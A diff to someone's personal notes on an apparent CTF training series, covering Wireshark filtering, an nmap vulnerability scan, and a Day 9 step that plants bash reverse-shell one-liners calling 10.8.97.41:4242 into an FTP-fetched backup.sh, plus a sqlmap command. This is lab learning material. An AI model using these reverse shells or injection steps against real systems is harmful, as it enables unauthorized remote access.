@@ -75,3 +75,21 @@ sqlmap --url http://10.10.159.207:8000/santapanel?search=abc --method=GET --dbms
 Another basic day, just getting a bit familiar with filtering in Wireshark. Useful but it remains way too basic.
 
 - Had some trouble saving the application/zip response as binary data because Wireshark kept hanging. Probably just my tiny laptop unable to handle it, took some waiting before it succeeded.
+
+# Day 8
+
+`export IP=10.10.73.122`
+
+I'm beginning to think that only the first 2 days were actually CTF challenges, the rest so far is just learning. Which is good, but a tad boring. This day it's just running nmap a couple of times. `nmap -sV -sC --script=vuln $IP`.
+
+#Day 9
+
+`export IP=10.10.250.178`
+
+- Login to the ftp as anonymous
+- get the backup.sh script and modify it by placing reverse shell code in it from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
+
+```sh
+bash -i >& /dev/tcp/10.8.97.41/4242 0>&1
+0<&196;exec 196<>/dev/tcp/10.8.97.41/4242; sh <&196 >&196 2>&196
+```
